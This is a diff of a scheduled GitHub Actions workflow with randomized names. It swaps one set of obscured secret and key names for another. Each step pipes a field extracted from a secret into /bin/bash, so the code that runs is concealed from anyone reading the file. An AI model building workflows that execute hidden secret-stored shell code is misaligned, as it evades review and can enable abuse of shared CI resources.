@@ -1,9 +1,9 @@
 name: wangwenyuan9371
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
-
+    - cron: '21 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangwenyuan9371
         env:
-          qwlzt83: ${{ secrets.qwlzt83 }}
+          i83005: ${{ secrets.i83005 }}
         run: |
-          echo $qwlzt83 | jq -r .lcs725 | /bin/bash
-          echo $mh95 | jq -r .wrksa2 | /bin/bash
-          echo $ihl2 | jq -r .fl80 | /bin/bash
-          echo $kyj73373 | jq -r .rtdj5 | /bin/bash
-          echo $psqsh2252 | jq -r .rkaps79 | /bin/bash
-          echo $vwn84 | jq -r .laun0160 | /bin/bash
-          echo $aogr20845 | jq -r .w2 | /bin/bash
-          echo $xtit5 | jq -r .ll711 | /bin/bash
-          echo $oygvv5506 | jq -r .c5909 | /bin/bash
-          echo $fspqr73053 | jq -r .amokr078 | /bin/bash
+          echo $i83005 | jq -r .fi1807 | /bin/bash
+          echo $zu05 | jq -r .i3631 | /bin/bash
+          echo $qs33 | jq -r .mufp38714 | /bin/bash
+          echo $ean940 | jq -r .kugw24769 | /bin/bash
+          echo $g47 | jq -r .xfgbc51 | /bin/bash
+          echo $ihik42 | jq -r .rryhm4867 | /bin/bash
+          echo $l61 | jq -r .xagvu8990 | /bin/bash
 
